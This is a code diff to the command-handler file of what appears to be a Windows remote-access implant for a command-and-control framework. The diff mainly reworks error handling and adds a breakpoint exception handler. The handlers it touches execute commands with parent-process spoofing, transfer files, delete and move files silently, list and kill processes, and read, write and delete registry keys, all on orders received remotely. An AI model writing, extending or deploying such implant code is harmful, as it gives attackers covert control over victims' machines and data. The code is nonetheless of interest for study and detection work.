@@ -1,5 +1,30 @@
 #include "pch.h"
 
+LONG ContinuableExceptionHanlder
+(
+	_In_ PEXCEPTION_POINTERS ExceptionInfo
+)
+{
+	DWORD dwExpceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
+	LPWSTR lpErrorDesc = NULL;
+	LPSTR lpTempStr = NULL;
+	DWORD dwTlsIdx = 0;
+
+	lpErrorDesc = (LPWSTR)ExceptionInfo->ExceptionRecord->ExceptionInformation[0];
+	if (dwExpceptionCode == EXCEPTION_BREAKPOINT && lpErrorDesc != NULL) {
+		dwTlsIdx = TlsAlloc();
+		if (dwTlsIdx != TLS_OUT_OF_INDEXES) {
+			lpTempStr = ConvertWcharToChar(lpErrorDesc);
+			TlsSetValue(dwTlsIdx - 1, lpTempStr);
+			TlsFree(dwTlsIdx);
+		}
+		return EXCEPTION_CONTINUE_EXECUTION;
+	}
+	else {
+		return EXCEPTION_CONTINUE_SEARCH;
+	}
+}
+
 PENVELOPE CdHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -10,7 +35,6 @@ PENVELOPE CdHandler
 	PBUFFER* pTemp = NULL;
 	LPSTR lpRespData = NULL;
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	LPSTR lpNewPath = NULL;
 	DWORD dwReturnedLength = 0;
 
@@ -25,7 +49,7 @@ PENVELOPE CdHandler
 	}
 
 	if (!SetCurrentDirectoryA(lpNewPath)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "SetCurrentDirectoryA failed at %s", __FUNCTION__);
+		LOG_ERROR("SetCurrentDirectoryA", GetLastError());
 		goto CLEANUP;
 	}
 	
@@ -46,11 +70,6 @@ PENVELOPE CdHandler
 	pElement->pMarshalledData = NULL;
 	pElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (pTemp != NULL) {
 		FreeBuffer(pTemp[0]);
 		FREE(pTemp);
@@ -74,7 +93,6 @@ PENVELOPE ExecuteHandler
 )
 {
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement RecvElementList[6];
 	PPBElement RespElementList[4];
 	PPBElement pFinalElement = NULL;
@@ -146,7 +164,7 @@ PENVELOPE ExecuteHandler
 	if (dwParentPid > 0) {
 		hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
 		if (hParentProcess == NULL) {
-			lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcess() failed at %s", __FUNCTION__);
+			LOG_ERROR("OpenProcess", GetLastError());
 			goto CLEANUP;
 		}
 
@@ -172,7 +190,7 @@ PENVELOPE ExecuteHandler
 
 		hStdOut = CreateFileA(lpStdOutPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hStdOut == INVALID_HANDLE_VALUE) {
-			lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
+			LOG_ERROR("CreateFileA", GetLastError());
 			goto CLEANUP;
 		}
 
@@ -183,7 +201,7 @@ PENVELOPE ExecuteHandler
 		else {
 			hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (hStdErr == INVALID_HANDLE_VALUE) {
-				lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
+				LOG_ERROR("CreateFileA", GetLastError());
 				goto CLEANUP;
 			}
 
@@ -193,7 +211,7 @@ PENVELOPE ExecuteHandler
 
 	StartupInfo.StartupInfo.cb = sizeof(StartupInfo);
 	if (!CreateProcessA(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateProcessA() failed at %s", __FUNCTION__);
+		LOG_ERROR("CreateProcessA", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -234,11 +252,6 @@ PENVELOPE ExecuteHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (ProcessInfo.hThread != NULL) {
 		CloseHandle(ProcessInfo.hThread);
 	}
@@ -312,7 +325,6 @@ PENVELOPE UploadHandler
 )
 {
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement RecvElementList[4];
 	LPVOID* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
@@ -340,7 +352,7 @@ PENVELOPE UploadHandler
 		lpPath = DuplicateStrA(((PBUFFER*)UnmarshalledData)[0]->pBuffer, 0);
 		lpTempStr = ConvertCharToWchar(lpPath);
 		if (!IsFolderExist(lpTempStr)) {
-			lpErrorDesc = CreateFormattedErr(0, "Folder %s is not exist", lpPath);
+			LogError(L"Folder %s is not exist", lpTempStr);
 			goto CLEANUP;
 		}
 	}
@@ -361,7 +373,6 @@ PENVELOPE UploadHandler
 	if (IsDirectory) {
 		GenerateTempPathW(NULL, L".zip", NULL, &lpZipPath);
 		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
-			lpErrorDesc = CreateFormattedErr(0, "Failure in writing zip file to %TEMP%");
 			goto CLEANUP;
 		}
 
@@ -375,7 +386,6 @@ PENVELOPE UploadHandler
 
 		lpPath = StrCatExA(lpPath, lpFileName);
 		if (!WriteToFileA(lpPath, pData->pBuffer, pData->cbBuffer)) {
-			lpErrorDesc = CreateFormattedErr(0, "Failure in writing file tp %s", lpPath);
 			goto CLEANUP;
 		}
 	}
@@ -383,11 +393,6 @@ PENVELOPE UploadHandler
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		FreeBuffer((PBUFFER)UnmarshalledData[0]);
 		FreeBuffer((PBUFFER)UnmarshalledData[1]);
@@ -423,7 +428,6 @@ PENVELOPE DownloadHandler
 )
 {
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement pRecvElement = NULL;
 	PPBElement pRespElement[2];
 	PPBElement pFinalElement = NULL;
@@ -446,7 +450,7 @@ PENVELOPE DownloadHandler
 	lpPath = DuplicateStrA(((PBUFFER*)UnmarshalledData)[0]->pBuffer, 0);
 	lpTempStr = ConvertCharToWchar(lpPath);
 	if (!IsPathExist(lpTempStr)) {
-		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		LogError(L"%s is not exist", lpTempStr);
 		goto CLEANUP;
 	}
 
@@ -459,7 +463,6 @@ PENVELOPE DownloadHandler
 	pData = ALLOC(sizeof(BUFFER));
 	pData->pBuffer = ReadFromFile(lpZipPath, &pData->cbBuffer);
 	if (pData->pBuffer == NULL || pData->cbBuffer == 0) {
-		lpErrorDesc = CreateFormattedErr(0, "Failed to download %s", lpPath);
 		goto CLEANUP;
 	}
 
@@ -476,11 +479,6 @@ PENVELOPE DownloadHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		FreeBuffer((PBUFFER)UnmarshalledData[0]);
 		FREE(UnmarshalledData);
@@ -514,9 +512,9 @@ PENVELOPE MkdirHandler
 	DWORD dwNumberOfBytesRead = 0;
 	PBUFFER* pTemp = NULL;
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	DWORD dwReturnedLength = 0;
 	LPWSTR lpPath = NULL;
+	DWORD dwErrorCode = ERROR_SUCCESS;
 
 	pElement = ALLOC(sizeof(PBElement));
 	pElement->Type = Bytes;
@@ -528,8 +526,9 @@ PENVELOPE MkdirHandler
 		lpPath[lstrlenW(lpPath) - 1] = L'\0';
 	}
 
-	if (!SHCreateDirectory(NULL, lpPath)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHCreateDirectory failed at %s", __FUNCTION__);
+	dwErrorCode = SHCreateDirectory(NULL, lpPath);
+	if (dwErrorCode != ERROR_SUCCESS) {
+		LOG_ERROR("SHCreateDirectory", dwErrorCode);
 		goto CLEANUP;
 	}
 
@@ -543,11 +542,6 @@ PENVELOPE MkdirHandler
 	pElement->pMarshalledData = NULL;
 	pElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (pTemp != NULL) {
 		FreeBuffer(pTemp[0]);
 		FREE(pTemp);
@@ -610,7 +604,7 @@ PENVELOPE RmHandler
 	BOOL Recursive = FALSE;
 	LPWSTR lpConvertedPath = NULL;
 	SHFILEOPSTRUCTW ShFileStruct;
-	LPSTR lpErrorDesc = NULL;
+	DWORD dwErrorCode = ERROR_SUCCESS;
 
 	for (i = 0; i < _countof(Element); i++) {
 		Element[i] = ALLOC(sizeof(PBElement));
@@ -634,8 +628,9 @@ PENVELOPE RmHandler
 	ShFileStruct.wFunc = FO_DELETE;
 	ShFileStruct.pFrom = DuplicateStrW(lpConvertedPath, 2);
 	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
-	if (SHFileOperationW(&ShFileStruct)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
+	dwErrorCode = SHFileOperationW(&ShFileStruct);
+	if (dwErrorCode != ERROR_SUCCESS) {
+		LOG_ERROR("SHFileOperationW", dwErrorCode);
 		goto CLEANUP;
 	}
 
@@ -649,11 +644,6 @@ PENVELOPE RmHandler
 	RespElement->pMarshalledData = NULL;
 	RespElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (ShFileStruct.pFrom != NULL) {
 		FREE(ShFileStruct.pFrom);
 	}
@@ -691,7 +681,7 @@ PENVELOPE MvHandler
 	LPWSTR lpSrc = NULL;
 	LPWSTR lpDest = NULL;
 	SHFILEOPSTRUCTW ShFileStruct;
-	LPSTR lpErrorDesc = NULL;
+	DWORD dwErrorCode = ERROR_SUCCESS;
 
 	for (i = 0; i < _countof(Element); i++) {
 		Element[i] = ALLOC(sizeof(PBElement));
@@ -709,19 +699,15 @@ PENVELOPE MvHandler
 	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
 	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
 	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
-	if (SHFileOperationW(&ShFileStruct)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
+	dwErrorCode = SHFileOperationW(&ShFileStruct);
+	if (dwErrorCode != ERROR_SUCCESS) {
+		LOG_ERROR("SHFileOperationW", dwErrorCode);
 		goto CLEANUP;
 	}
 
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (ShFileStruct.pFrom != NULL) {
 		FREE(ShFileStruct.pFrom);
 	}
@@ -765,7 +751,7 @@ PENVELOPE CpHandler
 	LPWSTR lpSrc = NULL;
 	LPWSTR lpDest = NULL;
 	SHFILEOPSTRUCTW ShFileStruct;
-	LPSTR lpErrorDesc = NULL;
+	DWORD dwErrorCode = ERROR_SUCCESS;
 
 	for (i = 0; i < _countof(Element); i++) {
 		Element[i] = ALLOC(sizeof(PBElement));
@@ -783,8 +769,9 @@ PENVELOPE CpHandler
 	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
 	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
 	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
-	if (SHFileOperationW(&ShFileStruct)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
+	dwErrorCode = SHFileOperationW(&ShFileStruct);
+	if (dwErrorCode != ERROR_SUCCESS) {
+		LOG_ERROR("SHFileOperationW", dwErrorCode);
 		goto CLEANUP;
 	}
 
@@ -802,11 +789,6 @@ PENVELOPE CpHandler
 	RespElement->pMarshalledData = NULL;
 	RespElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (ShFileStruct.pFrom != NULL) {
 		FREE(ShFileStruct.pFrom);
 	}
@@ -937,7 +919,6 @@ PENVELOPE IfconfigHandler
 	ULONG uMask = 0;
 	LPSTR lpHostName = NULL;
 	LPSTR lpPrimaryDnsSuffix = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
 	PFIXED_INFO pFixedInfo = NULL;
 	DWORD cbFixedInfo = sizeof(FIXED_INFO);
@@ -949,7 +930,6 @@ PENVELOPE IfconfigHandler
 
 	lpHostName = GetHostName();
 	if (lpHostName == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetHostName() failed at %s", __FUNCTION__);
 		goto CLEANUP;
 	}
 
@@ -991,7 +971,7 @@ PENVELOPE IfconfigHandler
 		pTemp = pAdapterInfo;
 		dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
 		if (dwErrorCode != ERROR_SUCCESS) {
-			lpErrorDesc = CreateFormattedErr(GetLastError(), "GetAdaptersAddresses() failed at %s", __FUNCTION__);
+			LOG_ERROR("GetAdaptersAddresses", GetLastError());
 			goto CLEANUP;
 		}
 	}
@@ -1167,11 +1147,6 @@ PENVELOPE IfconfigHandler
 	pElement->cbMarshalledData = 0;
 CLEANUP:
 	FreeElement(pElement);
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (pTemp != NULL) {
 		FREE(pTemp);
 	}
@@ -1285,7 +1260,6 @@ PENVELOPE LsHandler
 	LPSTR lpPath = NULL;
 	LPSTR lpFullPath = NULL;
 	LPWSTR lpConvertedPath = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
 	DWORD dwNumberOfItems = 0;
 	PFILE_INFO* FileList = NULL;
@@ -1308,7 +1282,7 @@ PENVELOPE LsHandler
 	lpFullPath = ALLOC(MAX_PATH + 1);
 	dwReturnedLength = GetFullPathNameA(lpPath, MAX_PATH + 1, lpFullPath, NULL);
 	if (dwReturnedLength == 0) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetFullPathNameA() failed at %s", __FUNCTION__);
+		LOG_ERROR("GetFullPathNameA", GetLastError());
 		goto CLEANUP;
 	}
 	else if (dwReturnedLength > MAX_PATH) {
@@ -1318,7 +1292,7 @@ PENVELOPE LsHandler
 
 	lpConvertedPath = ConvertCharToWchar(lpFullPath);
 	if (!IsPathExist(lpConvertedPath)) {
-		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpFullPath);
+		LogError(L"%s is not exist\n", lpConvertedPath);
 		goto CLEANUP;
 	}
 
@@ -1389,11 +1363,6 @@ PENVELOPE LsHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		FreeBuffer(UnmarshalledData[0]);
 		FREE(UnmarshalledData);
@@ -1438,7 +1407,6 @@ PENVELOPE IcaclsHandler
 	PBUFFER* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
 	LPWSTR lpTempPath = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
 	PACL pAcl = NULL;
 	PACE_HEADER pAceHdr = NULL;
@@ -1461,7 +1429,7 @@ PENVELOPE IcaclsHandler
 	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
 	lpTempPath = ConvertCharToWchar(lpPath);
 	if (!IsPathExist(lpTempPath)) {
-		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		LogError(L"%s is not exist\n", lpTempPath);
 		goto CLEANUP;
 	}
 
@@ -1679,11 +1647,6 @@ PENVELOPE IcaclsHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		FreeBuffer(UnmarshalledData[0]);
 		FREE(UnmarshalledData);
@@ -1750,7 +1713,6 @@ PENVELOPE PsHandler
 	PTOKEN_GROUP_INFO pGroupInfo = NULL;
 	DWORD dwPrivilegeAttr = 0;
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	DWORD dwTemp = 0;
 	PPBElement pReceivedElement = NULL;
 	PUINT64 pUnmarshalledPid = NULL;
@@ -1761,7 +1723,6 @@ PENVELOPE PsHandler
 	pUnmarshalledPid = UnmarshalStruct(&pReceivedElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
 	pProcesses = EnumProcess(&cbProcesses);
 	if (pProcesses == NULL || cbProcesses == 0) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
 		goto CLEANUP;
 	}
 
@@ -1930,11 +1891,6 @@ PENVELOPE PsHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (pUnmarshalledPid != NULL) {
 		FREE(pUnmarshalledPid);
 	}
@@ -1965,7 +1921,6 @@ PENVELOPE TerminateHandler
 	PPBElement RecvElementList[2];
 	DWORD i = 0;
 	PUINT64 UnmarshalledData = NULL;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement pFinalElement = NULL;
 	DWORD dwPid = 0;
 	BOOL Force = FALSE;
@@ -1985,12 +1940,12 @@ PENVELOPE TerminateHandler
 	dwPid = UnmarshalledData[0];
 	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
 	if (hProcess == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcess() failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenProcess", GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!TerminateProcess(hProcess, 0)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "TerminateProcess() failed at %s", __FUNCTION__);
+		LOG_ERROR("TerminateProcess", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -2003,11 +1958,6 @@ PENVELOPE TerminateHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		FREE(UnmarshalledData);
 	}
@@ -2139,7 +2089,6 @@ PENVELOPE RegistryReadHandler
 	LPSTR lpPath = NULL;
 	LPSTR lpValueName = NULL;
 	HKEY hRootKey = NULL;
-	LPSTR lpErrorDesc = NULL;
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
 	DWORD dwValueType = 0;
@@ -2208,7 +2157,7 @@ PENVELOPE RegistryReadHandler
 	
 	lpTemp = NULL;
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegOpenKeyExA", Status);
 		goto CLEANUP;
 	}
 
@@ -2225,15 +2174,16 @@ PENVELOPE RegistryReadHandler
 			dwValueType = REG_SZ;
 		}
 		else {
-			lpErrorDesc = CreateFormattedErr(Status, "RegGetValueA failed at %s", __FUNCTION__);
+			LOG_ERROR("RegGetValueA", Status);
 			goto CLEANUP;
 		}
 	}
 	else {
-		pData = ALLOC(cbData + 1);
+		cbData += 2;
+		pData = ALLOC(cbData);
 		Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, pData, &cbData);
 		if (Status != ERROR_SUCCESS) {
-			lpErrorDesc = CreateFormattedErr(Status, "RegGetValueA failed at %s", __FUNCTION__);
+			LOG_ERROR("RegGetValueA", Status);
 			goto CLEANUP;
 		}
 	}
@@ -2280,7 +2230,7 @@ PENVELOPE RegistryReadHandler
 		}
 	}
 	else {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "Invalid value type");
+		LogError(L"Invalid value type\n");
 		goto CLEANUP;
 	}
 
@@ -2293,11 +2243,6 @@ PENVELOPE RegistryReadHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			FreeBuffer(UnmarshalledData[i]);
@@ -2354,7 +2299,6 @@ PENVELOPE RegistryWriteHandler
 	HKEY hRootKey = NULL;
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
-	LPSTR lpErrorDesc = NULL;
 	LPSTR lpTemp = NULL;
 	PPBElement pFinalElement = NULL;
 	DWORD dwValueType = 0;
@@ -2382,7 +2326,6 @@ PENVELOPE RegistryWriteHandler
 	dwValueType = (DWORD)UnmarshalledData[9];
 	if (dwValueType == 1) {
 		if (UnmarshalledData[5] == NULL) {
-			lpErrorDesc = CreateFormattedErr(0, "Binary value is not provided");
 			goto CLEANUP;
 		}
 
@@ -2405,7 +2348,6 @@ PENVELOPE RegistryWriteHandler
 	}
 	else if (dwValueType == 2) {
 		if (UnmarshalledData[4] == NULL) {
-			lpErrorDesc = CreateFormattedErr(0, "String value is not provided");
 			goto CLEANUP;
 		}
 
@@ -2454,19 +2396,19 @@ PENVELOPE RegistryWriteHandler
 		FREE(lpValueName);
 		lpValueName = NULL;
 		if (dwValueType != REG_SZ) {
-			lpErrorDesc = CreateFormattedErr(0, "Cannot assign this registry type to default key value");
+			LogError("Cannot assign this registry type to default key value\n");
 			goto CLEANUP;
 		}
 	}
 
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegOpenKeyExA", Status);
 		goto CLEANUP;
 	}
 
 	Status = RegSetValueExA(hKey, lpValueName, 0, dwValueType, pValue, cbValue);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegSetValueExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegSetValueExA", Status);
 		goto CLEANUP;
 	}
 
@@ -2479,11 +2421,6 @@ PENVELOPE RegistryWriteHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			if (RecvElementList[i]->Type != Varint) {
@@ -2538,7 +2475,6 @@ PENVELOPE RegistryCreateKeyHandler
 	HKEY hRootKey = NULL;
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
-	LPSTR lpErrorDesc = NULL;
 	LPSTR lpTemp = NULL;
 	PPBElement pFinalElement = NULL;
 
@@ -2587,7 +2523,7 @@ PENVELOPE RegistryCreateKeyHandler
 	lpTemp = StrCatExA(lpTemp, lpKeyName);
 	Status = RegCreateKeyA(hRootKey, lpTemp, &hKey);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegCreateKeyA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegCreateKeyA", Status);
 		goto CLEANUP;
 	}
 	
@@ -2600,11 +2536,6 @@ PENVELOPE RegistryCreateKeyHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			FreeBuffer(UnmarshalledData[i]);
@@ -2658,7 +2589,6 @@ PENVELOPE RegistryDeleteKeyHandler
 	HKEY hRootKey = NULL;
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
-	LPSTR lpErrorDesc = NULL;
 	LPSTR lpTemp = NULL;
 	PPBElement pFinalElement = NULL;
 
@@ -2711,28 +2641,28 @@ PENVELOPE RegistryDeleteKeyHandler
 		lpValueName = NULL;
 	}
 	else if (Status != ERROR_FILE_NOT_FOUND) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegOpenKeyExA", Status);
 		goto CLEANUP;
 	}
 
 	RegCloseKey(hKey);
 	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegOpenKeyExA", Status);
 		goto CLEANUP;
 	}
 
 	if (lpValueName == NULL) {
 		Status = RegDeleteKeyA(hKey, lpKeyName);
 		if (Status != ERROR_SUCCESS) {
-			lpErrorDesc = CreateFormattedErr(Status, "RegDeleteKeyA failed at %s", __FUNCTION__);
+			LOG_ERROR("RegDeleteKeyA", Status);
 			goto CLEANUP;
 		}
 	}
 	else {
 		Status = RegDeleteValueA(hKey, lpValueName);
 		if (Status != ERROR_SUCCESS) {
-			lpErrorDesc = CreateFormattedErr(Status, "RegDeleteValueA failed at %s", __FUNCTION__);
+			LOG_ERROR("RegDeleteValueA", Status);
 			goto CLEANUP;
 		}
 	}
@@ -2746,11 +2676,6 @@ PENVELOPE RegistryDeleteKeyHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			FreeBuffer(UnmarshalledData[i]);
@@ -2807,7 +2732,6 @@ PENVELOPE RegistrySubKeysListHandler
 	HKEY hRootKey = NULL;
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement pFinalElement = NULL;
 	DWORD cSubKeys = 0;
 	DWORD dwMaxSubKeyLength = 0;
@@ -2853,13 +2777,13 @@ PENVELOPE RegistrySubKeysListHandler
 
 	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegOpenKeyExA", Status);
 		goto CLEANUP;
 	}
 
 	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &cSubKeys, &dwMaxSubKeyLength, NULL, NULL, NULL, NULL, NULL, NULL);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegQueryInfoKeyA failed at %s", __FUNCTION__);
